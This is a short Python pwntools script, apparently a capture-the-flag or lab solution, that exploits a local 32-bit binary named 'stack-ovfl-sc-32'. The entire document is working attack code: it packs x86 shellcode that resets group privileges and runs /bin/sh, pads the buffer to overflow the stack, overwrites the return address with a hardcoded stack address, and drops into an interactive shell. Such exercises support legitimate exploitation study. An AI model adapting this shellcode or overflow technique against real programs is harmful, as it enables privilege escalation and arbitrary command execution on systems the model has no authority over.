#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']

p = process('./stack-ovfl-sc-32')
#gdb.attach(p)

#c = Core('./core')
#bufAddr = c.stack.find(buf)
#print(hex(bufAddr))

buf = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'
buf = buf + "A" * (0x8c - len(buf)) + p32(0xffffc490)

p.sendline(buf)
print(p.recv())

p.interactive()
